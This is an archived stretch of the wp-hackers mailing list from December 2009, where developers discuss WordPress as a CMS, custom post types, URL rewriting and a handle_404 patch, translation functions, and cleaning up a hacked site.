Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
 read...)
In-Reply-To: <8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
	<8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>
Message-ID: <4B170635.9090106@gmail.com>

Mike Schinkel wrote:
> On Dec 2, 2009, at 6:42 PM, Jared Bangs wrote:
>> If you believe (as I do) that "WordPress is not, and should not be,
>> all things to all people" (to quote Otto's first message in this
>> thread), then it's better to identify up front what it should be...
> 
> 
> So what would that be?
> 
> Personally I like what's on WordPress.org:
> 
> WordPress is a state-of-the-art publishing platform with a focus on aesthetics, web standards, and usability. WordPress is both free and priceless at the same time.
> 
> Is that not correct?  Does anyone feel that should be changed?
> 
> Based on that, I'd argue that custom post types and custom URLs are a must have for a "state-of-the-art publishing platform."  Is there a valid argument against that?
> 
> Would I think WordPress is a good platform to build a new SAAS offering?  Not so much.
> 
>> This thread isn't about particular features, it's about a mindset.
>> Specifically, one that sees a problem or project and says "how can I
>> handle this... with WordPress" rather than just "what's the best way
>> to handle this". It's my opinion that the former approach is overly
>> narrow, and CAN lead to the advocating of unnecessary core features in
>> order to support it.
> 
> I'd propose another question: "Is there a solid reason WordPress cannot handle this?"  
> 
> WordPress brings along far more benefits than any other proposed alternative. Using something else leaves the user without those many benefits which to me is not a smart solution.
> 
> On Dec 2, 2009, at 7:04 PM, Harish Narayanan wrote:
>>> That is the one risk of doing it that way. Writing code can take a while,
>>> and it would feel like a waste of time if it wasn't accepted.
>> Except, of course, it usually isn't a waste of time because you wrote
>> the code in the first place because it worked (on whatever level) for you!
> 
> 
> Point of note if the modification is to the core and it's not accepted it is a waste of time because no one in their right mind should deploy a modified version of the core if those mods are not going to get rolled into the core.  So it's only not a waste of time if the mods are in plugin or theme form.

And why is that?

I maintain a slew of small changes with respect to WordPress pristine
that makes it work more the way I want it to. I use this modified
version every day, while keeping up to date with the development
version. I haven't run into any problems because of working this way.

The reason these changes stay local to my machines is because they're
only useful for my purposes. And the reason they're modifications to
core is because because I'm too lazy to encapsulate everything into a
plugin when a few direct core hacks will get the job done in seconds.

Harish

From mikeschinkel at newclarity.net  Thu Dec  3 00:42:08 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 19:42:08 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <4B170635.9090106@gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
	<8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>
	<4B170635.9090106@gmail.com>
Message-ID: <2711C601-271E-454C-A1A7-7DABEC9C3DAD@newclarity.net>

On Dec 2, 2009, at 7:28 PM, Harish Narayanan wrote:
> Mike Schinkel wrote:
>> On Dec 2, 2009, at 7:04 PM, Harish Narayanan wrote:
>>>> That is the one risk of doing it that way. Writing code can take a while,
>>>> and it would feel like a waste of time if it wasn't accepted.
>>> Except, of course, it usually isn't a waste of time because you wrote
>>> the code in the first place because it worked (on whatever level) for you!
>> Point of note if the modification is to the core and it's not accepted it is a waste of time because no one in their right mind should deploy a modified version of the core if those mods are not going to get rolled into the core.  So it's only not a waste of time if the mods are in plugin or theme form.
> 
> And why is that?
> 
> I maintain a slew of small changes with respect to WordPress pristine
> that makes it work more the way I want it to. I use this modified
> version every day, while keeping up to date with the development
> version. I haven't run into any problems because of working this way.
> 
> The reason these changes stay local to my machines is because they're
> only useful for my purposes. And the reason they're modifications to
> core is because because I'm too lazy to encapsulate everything into a
> plugin when a few direct core hacks will get the job done in seconds.

Because I want to be able to update when a new version comes out without having to hack to core to replace my own prior mods.  I especially don't want to do it to a client either given how I prefer to give them something they themselves can maintain and I no longer have to be there for every beck and call.  

I actually think anyone that delivers a hacked version of WordPress to a client is doing them a huge disservice.

Here's something that Drupal.org says about the same issue for Drupal:

http://drupal.org/node/144376

-Mike



From nexflo at gmail.com  Thu Dec  3 01:31:16 2009
From: nexflo at gmail.com (Florian Woegerer)
Date: Thu, 3 Dec 2009 02:31:16 +0100
Subject: [wp-hackers] Database structure Wordpress
Message-ID: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>

The Database structure of Wordpress should be rethought if Wordpress is going to move to a more and more CMS's based system. (last week's CMS Award seems that this is indeed the case)

In times of PDO, Doctrine etc. creating a sweet Database layout shouldnt be the biggest issue no more?

Why not update the sql tables names when creating a new page type? i.e. we create a new post/page type titled "cars"...why not create a new database table entitled cars with all default fields in there. Custom fields would simple add a new Field/Column into that table. in this way we would have an extremly clean database design, which other applications can tap into easily as well. This would result in a high performance database layout and offer a great new way to design flexible, scalable applications.

The benefit would be extremely great too all powerusers/cms users etc. and normal "blog" users wouldn't feel a thing as for them nothing changes. (sure the huge amount of plugins would need a wrapper till things are updated)

Wordpress doesn't get bloated, but just more mature.
Using convention over configuration would allows wordpress to tap into existing databases which have an incremental id and use that data instantly. (if the database layout fits a certain style and some additional fields (published, author etc. are added)

would love to hear some thoughts on this

Thanks Florian

From wp-hackers at striderweb.com  Thu Dec  3 01:41:25 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 2 Dec 2009 19:41:25 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
Message-ID: <483AB521-875E-4E64-BDC0-5439D4B29A76@striderweb.com>

Hi all --

On Dec 2, 2009, at 5:42 PM, Jared Bangs wrote:

> On Wed, Dec 2, 2009 at 2:49 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> 

>> There's a belief held by many that adding features necessarily affects performance negatively. That is not by any means a rule and to make decisions based on only that assumption does a disservice to the broader community.  Having the option of custom post types and the option of URL routing should not negatively affect those sites that do not use those options if the enhancements are architected with performance in mind.
> 
> If on the other hand, you think that WordPress is (or should become)
> the ideal solution for every possible web project (a position I think
> is clearly wrong and cannot relate to), then it would make sense that
> the scope of the core WP project would need to be (or become) enormous
> in order to accommodate that.

I'll start by stating overall position, then get on to specifics

1) I heartily agree with and support the prospect of creating API functions the make it easy (simple!) for plugins to add custom post types.

2) I also strongly support abstracting out "Edit <post type x>" pages in Admin so that plugins can say "I need an edit page for Post Type X.  It needs (for example) the Main Text Box, Tags, and Excerpt.  Bang!  Done."

3) I understand the wariness of bloating the core with extraneous additions, but I do not believe that this situation needs to be such.  I believe that it could be done by creating a few robust, flexible functions, and a bit of reorganization.

Now, some specifics:

I'm not overly familiar with the Custom Post Type code (yet) so I can't make precise suggestions, BUT I would like to point out a patch that I recently created, that has been committed for WP 2.9.  This patch is in ways similar, in that I saw a need and created a patch that

1) adds flexibility to the area to which it applies

2) Consolidates code in areas where different functions has substantially identical code.

3) Reduces redundancy in multiple places where (for example) a series of parameters had to be specified twice.

	3a) Said parameters are readily modified by plugins

4) Created a new function that can be used by plugins to very easily create custom functions that were much more difficult (and again, redundant) to do before.  A few pre-existing functions are recreated as wrappers to the new "core" function.

	4a) The new "core" function is written in a way that it can automatically add hooks to any new wrapper functions that may be created by plugins

5) No bloat.  Adds a single new function; and two pre-existing functions are significantly simplified.

Here's the ticket:

<http://core.trac.wordpress.org/ticket/8964>

Specifically, get_plugin_data() and get_theme_data() used to be completely separate pieces of code, but did basically the same thing.  I abstracted out a new function, get_file_data(), and both of the original functions are basically wrappers that use the new one for their core functionality.  As a bonus, plugins can also put get_file_data() in a custom wrapper to read headers off of custom "add on" files of their own.  (Also pay attention to the $context parameter!)

So how does this apply to to custom Post Types?

We create a new function that is basically "add_post_edit_page".  Parameters are a location, the Post Type to which it applies, and an array containing a list of features that the Edit Page needs (Text Box, Categories, Tags, Excerpt, etc.).

Then we abstract the existing code so that the two standard pages, Edit Post, and Edit Page, use this new function.

Cutting a bit short -- have to go.  I'll chime in again later, but what do people think of this?

Stephen

-- 
Stephen Rider
http://striderweb.com/


From mikeschinkel at newclarity.net  Thu Dec  3 03:30:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 22:30:53 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <483AB521-875E-4E64-BDC0-5439D4B29A76@striderweb.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
	<483AB521-875E-4E64-BDC0-5439D4B29A76@striderweb.com>
Message-ID: <71ABC502-055E-486D-9692-543636476ADD@newclarity.net>

On Dec 2, 2009, at 8:41 PM, Stephen Rider wrote:
> So how does this apply to to custom Post Types?
> 
> We create a new function that is basically "add_post_edit_page".  Parameters are a location, the Post Type to which it applies, and an array containing a list of features that the Edit Page needs (Text Box, Categories, Tags, Excerpt, etc.).
> 
> Then we abstract the existing code so that the two standard pages, Edit Post, and Edit Page, use this new function.
> 
> Cutting a bit short -- have to go.  I'll chime in again later, but what do people think of this?

That's exactly the types of discussion I hoped to have here.  So yes.

-Mike

From casey.bisson at gmail.com  Thu Dec  3 04:01:52 2009
From: casey.bisson at gmail.com (Casey Bisson)
Date: Wed, 2 Dec 2009 23:01:52 -0500
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <op.u4bf53c51214gw@akshay-pc>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
	<op.u4bf53c51214gw@akshay-pc>
Message-ID: <3ee7077c0912022001r23d9cadbuefc503904ab3c880@mail.gmail.com>

Do you mean 5,000,000 or 500,000 posts?

Either way, your supposition in the forum post is probably reasonable:
sorting a large number of posts by datetime is problematic. If you can
tolerate it, you might do well to change the datetime fields to simple date.

A core patch to switch the posts table to use paired date and time columns
would be more efficient, but also a lot of work to develop.

I assume you've got caching of some sort running, otherwise you'd probably
also experience problems on the front end and everywhere else too.

So, what are you doing with 5,000,000 or 500,000 posts?

--Casey

http://maisonbisson.com/
http://about.scriblio.net/


On Wed, Dec 2, 2009 at 10:04 AM, Akshay Jain <aj at akshayjain.org> wrote:

> Can anyone provide me a solution to this problem ? Only the admin panel is
> loading slowly. The frontend is fine!
>
> http://wordpress.org/support/topic/337220?replies=3#post-1299216
>
> Thanks
> Akshay
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Thu Dec  3 04:24:26 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 23:24:26 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <op.u34834dqspxmuu@dd32>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<op.u34834dqspxmuu@dd32>
Message-ID: <7C540104-98C9-474B-9F56-EA29F2525E8F@newclarity.net>

On Nov 29, 2009, at 1:46 AM, Dion Hulse (dd32) wrote:
> For everyones benefit, i've just written a quick plugin which achieves what you set out to do with the product rewrite rules, whilst reducing the ammount of useless SQL queries performed as well as avoiding some rather messy code:
> 
> http://dd32.id.au/uploads/2009/11/HTDIR_URL_Rewrite.zip
> 
> In a nutshell:
> * 3 filters to control Rewrite, Query, and Template
> * No eronous SQL queries, The only query is the product load query. (I'm refering to post queries here btw)
> * Works with WordPress 2.9, 2.8 should work too
> * Fair bit of comments inline, Not finished obviously
> * Takes /products/<slug> and spits out post_type = product
> * Works no matter what your permastructure is ( none, ie. ?product=product-1, /product/product-1/, /index.php/product/product-1/)
> * Admin panel to add/remove products
> * 2 lines which i would call hackish.. But thats only telling wordpress that we're on a custom page.. (is_single = true, is_home = false)
> * Uses a custom page template bundled with the plugin (Taken from single.php from default theme, removed a bit of code, bare basics)
> * Uses as much of the API as currently exists for it.
> * Not finished 100%, Final few touches need to be put on, such as flushing of rules on deactivation
> 
> Yes, This is not a complete writeup, Its just to demonstrate, that the code does not have to be as messy as you've quoted, And while its longer and more verbose than add_cusotm_url(), its definately a better start.

So I finally had a chance to review this.  I'm working with it on 2.8.6.

While it may "do it right" it actually doesn't work, for at least two reasons.  (Dion, did you actually test it?  Did it even work in 2.9?)  

Anyway:

1.) The plugin treats parse_query as a filter yet it's run as an action.  Returning a modified request does nothing.  (Should it be run as a filter instead of an action?  Most probably.  But we can at least work around it temporarily.)

2.) More importantly $wp->handle_404() [line 459 in /wp-includes/classes.php] basically blocks anything that's not previously been hardcoded into WordPress core.  To get around it you have to do some ugly hacks.  My prior plugin accomplished it but the "HTDIR" plugin did not.

Maybe the first thing to discuss is "How should $wp->handle_404() be modified to support URL rewriting?"  As a strawman, I propose the following (please suggest better ways of handling this.) 

On line 462 of /wp-includes/classes.php insert the following three lines of code:

if (apply_filters('handle_404',false))
  status_header(200);
else

With that and some hacking in the parse_query function to set $wp_query to the modified as well as set $wp_query->is_404 to false and $wp_query->is_product to true, and implementing a handle_404 hook I was able to get the basics of URL rewriting to work from Dion's HTDIR plugin although I haven't fleshed out any of the other aspects of the custom post types use cases.

BTW, I just checked and trunk for 2.9 hasn't modified $wp->handle_404() since 2.8.6 so this is still an issue.

Comments?  Alternatives?

-Mike
P.S. BTW, the whole $wp_query->is_* variable thing is not scalable and IMO all those $wp_query->is_* properties are one of the reasons WP code is hard to follow and bloated in its own right.  I wouldn't want to see us proliferate them even more; I used $wp->is_product simply because Dion had used it and I was going for as few changes as possible.

From wp-hackers at striderweb.com  Thu Dec  3 04:35:49 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 2 Dec 2009 22:35:49 -0600
Subject: [wp-hackers] two-underscore function arguments?
In-Reply-To: <1259744235.3614.7.camel@home>
References: <1259744235.3614.7.camel@home>
Message-ID: <A5965811-C40E-4863-B551-B49840B630A2@striderweb.com>


On Dec 2, 2009, at 2:57 AM, Ghodmode wrote:

> __('Duration', 'wpevents')
> 
> Searching the web tells me it has something to do with translation, but
> all of the examples I've seen only have one argument.  What's that
> second argument?

The second parameter is the "context" (textdoamin) of the string.  WP Core is assumed, so Core doesn't need the second parameter.  Plugins on the other hand, need to load their own textdomain, and then include the textdomain as the second parameter.

It's a fairly common mistake in plugins to use __() for translation without the textdomain. Doesn't work that way....

Stephen

From glenn at glennansley.com  Thu Dec  3 04:55:37 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Wed, 2 Dec 2009 23:55:37 -0500
Subject: [wp-hackers] two-underscore function arguments?
In-Reply-To: <A5965811-C40E-4863-B551-B49840B630A2@striderweb.com>
References: <1259744235.3614.7.camel@home>
	<A5965811-C40E-4863-B551-B49840B630A2@striderweb.com>
Message-ID: <7474be390912022055i27011051s54fc3e8638388e1d@mail.gmail.com>

Also related:

_e('Duration','textdomain') would echo it out while
__('Duration','textdomain') would simply return it.

On Wed, Dec 2, 2009 at 11:35 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
>
> On Dec 2, 2009, at 2:57 AM, Ghodmode wrote:
>
>> __('Duration', 'wpevents')
>>
>> Searching the web tells me it has something to do with translation, but
>> all of the examples I've seen only have one argument. ?What's that
>> second argument?
>
> The second parameter is the "context" (textdoamin) of the string. ?WP Core is assumed, so Core doesn't need the second parameter. ?Plugins on the other hand, need to load their own textdomain, and then include the textdomain as the second parameter.
>
> It's a fairly common mistake in plugins to use __() for translation without the textdomain. Doesn't work that way....
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jwriteclub at gmail.com  Thu Dec  3 05:18:21 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Wed, 2 Dec 2009 22:18:21 -0700
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <7C540104-98C9-474B-9F56-EA29F2525E8F@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com> 
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com> 
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<op.u34834dqspxmuu@dd32> 
	<7C540104-98C9-474B-9F56-EA29F2525E8F@newclarity.net>
Message-ID: <81d01c0912022118w2df8782cmf03405d6fbf72fac@mail.gmail.com>

Sorry I'm jumping into this so late, but I've been working on CouchDB
recently and didn't see this.

I am going to state that WP_Rewrite is inaccessible to anyone not intimately
familiar with the wordpress core. The first time I used it several years ago
it took hours and hours of testing and frustration to get it running.
Indeed, in projects which to not need to be scalable (distributable) I
usually use hard coded rules in .htaccess, referring to a wp_loader.php
which does URL parsing and then calls into wordpress. Hacky? Absolutely, but
still faster than dealing with WP_Rewrite, template redirect and the rest of
it.

Having a specific base URL return a specific "controller"/"view" for want of
a better word is a common use case. Is it absolutely academically correct to
conflate the two? Maybe not, but it is definitely useful.

Furthermore, all of the is_* are a symptom of trying to use a
controller/view heuristic without actually using a controller and view
explicitly.

I actually put my Profiles plugin on hold in development of version 3.0
because I couldn't get rewrites working consistently and reliably. I have
all of he underlying logic working, all of the admin panel magic, everything
except for URL rewriting.

In short, then, when working on plugins, my URL handling is the one part
that doesn't feel like poetry.

~ Christopher

On Wed, Dec 2, 2009 at 9:24 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Nov 29, 2009, at 1:46 AM, Dion Hulse (dd32) wrote:
> > For everyones benefit, i've just written a quick plugin which achieves
> what you set out to do with the product rewrite rules, whilst reducing the
> ammount of useless SQL queries performed as well as avoiding some rather
> messy code:
> >
> > http://dd32.id.au/uploads/2009/11/HTDIR_URL_Rewrite.zip
> >
> > In a nutshell:
> > * 3 filters to control Rewrite, Query, and Template
> > * No eronous SQL queries, The only query is the product load query. (I'm
> refering to post queries here btw)
> > * Works with WordPress 2.9, 2.8 should work too
> > * Fair bit of comments inline, Not finished obviously
> > * Takes /products/<slug> and spits out post_type = product
> > * Works no matter what your permastructure is ( none, ie.
> ?product=product-1, /product/product-1/, /index.php/product/product-1/)
> > * Admin panel to add/remove products
> > * 2 lines which i would call hackish.. But thats only telling wordpress
> that we're on a custom page.. (is_single = true, is_home = false)
> > * Uses a custom page template bundled with the plugin (Taken from
> single.php from default theme, removed a bit of code, bare basics)
> > * Uses as much of the API as currently exists for it.
> > * Not finished 100%, Final few touches need to be put on, such as
> flushing of rules on deactivation
> >
> > Yes, This is not a complete writeup, Its just to demonstrate, that the
> code does not have to be as messy as you've quoted, And while its longer and
> more verbose than add_cusotm_url(), its definately a better start.
>
> So I finally had a chance to review this.  I'm working with it on 2.8.6.
>
> While it may "do it right" it actually doesn't work, for at least two
> reasons.  (Dion, did you actually test it?  Did it even work in 2.9?)
>
> Anyway:
>
> 1.) The plugin treats parse_query as a filter yet it's run as an action.
>  Returning a modified request does nothing.  (Should it be run as a filter
> instead of an action?  Most probably.  But we can at least work around it
> temporarily.)
>
> 2.) More importantly $wp->handle_404() [line 459 in
> /wp-includes/classes.php] basically blocks anything that's not previously
> been hardcoded into WordPress core.  To get around it you have to do some
> ugly hacks.  My prior plugin accomplished it but the "HTDIR" plugin did not.
>
> Maybe the first thing to discuss is "How should $wp->handle_404() be
> modified to support URL rewriting?"  As a strawman, I propose the following
> (please suggest better ways of handling this.)
>
> On line 462 of /wp-includes/classes.php insert the following three lines of
> code:
>
> if (apply_filters('handle_404',false))
>  status_header(200);
> else
>
> With that and some hacking in the parse_query function to set $wp_query to
> the modified as well as set $wp_query->is_404 to false and
> $wp_query->is_product to true, and implementing a handle_404 hook I was able
> to get the basics of URL rewriting to work from Dion's HTDIR plugin although
> I haven't fleshed out any of the other aspects of the custom post types use
> cases.
>
> BTW, I just checked and trunk for 2.9 hasn't modified $wp->handle_404()
> since 2.8.6 so this is still an issue.
>
> Comments?  Alternatives?
>
> -Mike
> P.S. BTW, the whole $wp_query->is_* variable thing is not scalable and IMO
> all those $wp_query->is_* properties are one of the reasons WP code is hard
> to follow and bloated in its own right.  I wouldn't want to see us
> proliferate them even more; I used $wp->is_product simply because Dion had
> used it and I was going for as few changes as possible.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Thu Dec  3 06:13:32 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 01:13:32 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <7C540104-98C9-474B-9F56-EA29F2525E8F@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<op.u34834dqspxmuu@dd32>
	<7C540104-98C9-474B-9F56-EA29F2525E8F@newclarity.net>
Message-ID: <34FF60D8-989B-4922-8765-D89BFFB566E8@newclarity.net>

I just submitted a patch for $wp->handle_404() that is similar to what I proposed below but only run after the most common use cases fail thus having zero performance impact on cases that WordPress already handles.  

http://core.trac.wordpress.org/ticket/11312

Let's see what the outcome of the patch will be.

-Mike

On Dec 2, 2009, at 11:24 PM, Mike Schinkel wrote:

> On Nov 29, 2009, at 1:46 AM, Dion Hulse (dd32) wrote:
>> For everyones benefit, i've just written a quick plugin which achieves what you set out to do with the product rewrite rules, whilst reducing the ammount of useless SQL queries performed as well as avoiding some rather messy code:
>> 
>> http://dd32.id.au/uploads/2009/11/HTDIR_URL_Rewrite.zip
>> 
>> In a nutshell:
>> * 3 filters to control Rewrite, Query, and Template
>> * No eronous SQL queries, The only query is the product load query. (I'm refering to post queries here btw)
>> * Works with WordPress 2.9, 2.8 should work too
>> * Fair bit of comments inline, Not finished obviously
>> * Takes /products/<slug> and spits out post_type = product
>> * Works no matter what your permastructure is ( none, ie. ?product=product-1, /product/product-1/, /index.php/product/product-1/)
>> * Admin panel to add/remove products
>> * 2 lines which i would call hackish.. But thats only telling wordpress that we're on a custom page.. (is_single = true, is_home = false)
>> * Uses a custom page template bundled with the plugin (Taken from single.php from default theme, removed a bit of code, bare basics)
>> * Uses as much of the API as currently exists for it.
>> * Not finished 100%, Final few touches need to be put on, such as flushing of rules on deactivation
>> 
>> Yes, This is not a complete writeup, Its just to demonstrate, that the code does not have to be as messy as you've quoted, And while its longer and more verbose than add_cusotm_url(), its definately a better start.
> 
> So I finally had a chance to review this.  I'm working with it on 2.8.6.
> 
> While it may "do it right" it actually doesn't work, for at least two reasons.  (Dion, did you actually test it?  Did it even work in 2.9?)  
> 
> Anyway:
> 
> 1.) The plugin treats parse_query as a filter yet it's run as an action.  Returning a modified request does nothing.  (Should it be run as a filter instead of an action?  Most probably.  But we can at least work around it temporarily.)
> 
> 2.) More importantly $wp->handle_404() [line 459 in /wp-includes/classes.php] basically blocks anything that's not previously been hardcoded into WordPress core.  To get around it you have to do some ugly hacks.  My prior plugin accomplished it but the "HTDIR" plugin did not.
> 
> Maybe the first thing to discuss is "How should $wp->handle_404() be modified to support URL rewriting?"  As a strawman, I propose the following (please suggest better ways of handling this.) 
> 
> On line 462 of /wp-includes/classes.php insert the following three lines of code:
> 
> if (apply_filters('handle_404',false))
>   status_header(200);
> else
> 
> With that and some hacking in the parse_query function to set $wp_query to the modified as well as set $wp_query->is_404 to false and $wp_query->is_product to true, and implementing a handle_404 hook I was able to get the basics of URL rewriting to work from Dion's HTDIR plugin although I haven't fleshed out any of the other aspects of the custom post types use cases.
> 
> BTW, I just checked and trunk for 2.9 hasn't modified $wp->handle_404() since 2.8.6 so this is still an issue.
> 
> Comments?  Alternatives?
> 
> -Mike
> P.S. BTW, the whole $wp_query->is_* variable thing is not scalable and IMO all those $wp_query->is_* properties are one of the reasons WP code is hard to follow and bloated in its own right.  I wouldn't want to see us proliferate them even more; I used $wp->is_product simply because Dion had used it and I was going for as few changes as possible.


From scribu at gmail.com  Thu Dec  3 09:54:48 2009
From: scribu at gmail.com (scribu)
Date: Thu, 3 Dec 2009 11:54:48 +0200
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
Message-ID: <349fe48b0912030154l4b663103mfee4ba3fd0c9ef41@mail.gmail.com>

>
> Why not update the sql tables names when creating a new page type? i.e. we
> create a new post/page type titled "cars"...why not create a new database
> table entitled cars with all default fields in there. Custom fields would
> simple add a new Field/Column into that table. in this way we would have an
> extremly clean database design, which other applications can tap into easily
> as well. This would result in a high performance database layout and offer a
> great new way to design flexible, scalable applications.
>

Unless you have 100.000s of posts for each post type, I don't see the
benefit of this.

If you truly need to have a separate table for each post type, I believe you
can do this in a plugin without great effort. In WP 2.9, the meta tables can
be easily manipulated with the new metadata API.


-- 
http://scribu.net

From malaiac at gmail.com  Thu Dec  3 11:43:30 2009
From: malaiac at gmail.com (Malaiac)
Date: Thu, 3 Dec 2009 12:43:30 +0100
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <012801ca7381$70d0fbc0$5272f340$@com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
	<4B16A3BF.4050508@gmail.com>
	<e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>
	<d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com>
	<012801ca7381$70d0fbc0$5272f340$@com>
Message-ID: <59e7f3130912030343t69eda796y908a23854600b0d@mail.gmail.com>

Most hacked files were actually plugins files in another install of
wordpress (on a subdomain), while the subdomain itself was not
actually hacked (or not so obviously).
I'm going to rm * and make fresh installs on both subdomains.

M

2009/12/2 Brad Williams <bradw at illiams.com>:
> Also remember if you have multiple websites on the same hosting account they
> may also be compromised and should be checked. ?Even if they aren't showing
> signs of being hacked they could be.
>fo/wp-hackers
>

From gurdiga at gmail.com  Thu Dec  3 13:49:20 2009
From: gurdiga at gmail.com (Vlad GURDIGA)
Date: Thu, 3 Dec 2009 15:49:20 +0200
Subject: [wp-hackers] Internal links
Message-ID: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>

Hello,

Is there any reason why one cannot create an internal link? Like:
./2009/12/03/article-title.

From me at anthony.geek.nz  Thu Dec  3 13:50:54 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Fri, 4 Dec 2009 02:50:54 +1300
Subject: [wp-hackers] Internal links
In-Reply-To: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>
References: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>
Message-ID: <3EB8D702-1028-448D-907F-B4FB4E8C0767@anthony.geek.nz>

Enable Permalinks in Settings -> Permalinks :)

-ac

On 4/12/2009, at 2:49 AM, Vlad GURDIGA wrote:

> Hello,
> 
> Is there any reason why one cannot create an internal link? Like:
> ./2009/12/03/article-title.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


